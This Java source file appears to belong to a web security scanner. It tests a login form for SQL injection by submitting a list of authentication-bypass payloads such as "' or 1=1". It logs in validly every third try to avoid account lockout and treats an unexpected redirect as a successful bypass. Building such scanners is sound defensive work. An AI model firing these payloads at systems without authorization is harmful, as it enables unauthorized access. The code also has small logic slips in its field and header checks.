package org.feup.ses.pbst.tests;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.Header;
import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.feup.ses.pbst.Enums.PatternEnum;
import org.feup.ses.pbst.Enums.TestResultEnum;
import org.feup.ses.pbst.TestConfAndResult;
import org.feup.ses.pbst.Utils.Utils;
import org.feup.ses.pbst.patternTests.FormValuesHolder;
import org.feup.ses.pbst.patternTests.WebPage;

public class SqlInjection extends Test {

    private static long id = 0;

    private long myId = 0;

    private String password;
    private String username;

    public SqlInjection() {
        super();
    }

    public void test(WebPage webPage, TestConfAndResult pbstTest, FormValuesHolder holder, PatternEnum pattern) {

        myId = ++id;

        boolean vulnerable = false;

        if (holder != null && holder.getAction() != null) {

            if (holder.getInputUsername() != null && !"".equals(holder.getInputUsername())
                    && holder.getInputPassword() != null && !"".equals(holder.getInputUsername())) {

                String[] sql = {"'-'", "' or 1=1", "' or 1=1'", "' '", "'&'", "'^'", "'*'", "' or ''-'", "' or '' '", "' or ''&'", "' or ''^'",
                    "' or ''*'", "\"-\"", "\" \"", "\"&\"", "\"^\"", "\"*\"", "\" or \"\"-\"", "\" or \"\" \"",
                    "\" or \"\"&\"", "\" or \"\"^\"", "\" or \"\"*\"", "or true--", "\" or true--", "' or true--",
                    "\") or true--", "') or true--", "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x",
                    "\" or \"x\"=\"x", "\") or (\"x\")=(\"x", "\")) or ((\"x\"))=((\"x"};

                Long startTime = System.currentTimeMillis();
                Long currentTime = System.currentTimeMillis();

                for (int i = 0; i < sql.length; i++) {
                    password = sql[i];
                    username = sql[i];

                    //Do a valid login to prevent accountLockout
                    if (i % 3 == 0 && pbstTest.getCredentials() != null && pbstTest.getCredentials().get(0) != null) {
                        Utils.login(pbstTest, holder, pbstTest.getCredentials().get(0).getUsername(), pbstTest.getCredentials().get(0).getPassword());
                    }

                    try {
                        List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
                        urlParameters.add(new BasicNameValuePair(holder.getInputUsername(), username));
                        urlParameters.add(new BasicNameValuePair(holder.getInputPassword(), password));

                        HttpEntity entity = new UrlEncodedFormEntity(urlParameters);

                        HttpPost post = Utils.createPost(holder.getAction(), entity);

                        HttpClient client = HttpClientBuilder.create().build();

                        HttpResponse response = client.execute(post);

                        int statusCode = response.getStatusLine().getStatusCode();

                        EntityUtils.consume(entity);

                        if (statusCode == 200 && response.getLastHeader("Location") != null) {
                            String url = response.getLastHeader("Location").getValue();

                            if (url != null && !url.equals(pbstTest.getFailPage()) && !url.equals(pbstTest.getLoginPage())) {
                                vulnerable = true;
                                break;
                            }
                        }
                        if (statusCode == 301 || statusCode == 302) {
                            Header url = response.getLastHeader("Location");
                            if (url != null) {
                                System.out.println(url.getValue());
                            }

                            if (url != null && !url.equals(pbstTest.getFailPage()) && !url.equals(pbstTest.getLoginPage())) {
                                vulnerable = true;
                                break;
                            }
                        }

                        try {
                            currentTime = System.currentTimeMillis();
                            if (currentTime - startTime > 30000) {
                                startTime = currentTime;
                                Thread.sleep(1000);
                            }
                        } catch (InterruptedException e) {
                        }
                    } catch (IOException e) {
                        break;
                    }
                }
            }
        }

        if (vulnerable) {
            webPage.addTestResult(pattern, TestResultEnum.VULNERABLE, "SQL Injection", "It�s possible to authenticate using SQL Injection\nInjection: " + username);
        } else {
            webPage.addTestResult(pattern, TestResultEnum.SECURE);
        }
    }

    public long getMyId() {
        return myId;
    }
}
